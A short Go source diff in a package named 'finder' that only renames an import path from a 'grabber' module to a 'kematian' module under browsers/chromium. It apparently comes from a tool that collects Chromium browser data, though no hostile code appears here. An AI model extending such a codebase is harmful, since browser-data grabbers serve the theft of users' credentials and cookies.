@@ -1,7 +1,7 @@
 package finder
 
 import (
-	"kdot/grabber/browsers/chromium/structs"
+	"kdot/kematian/browsers/chromium/structs"
 	"os"
 	"path/filepath"
 	"strings"
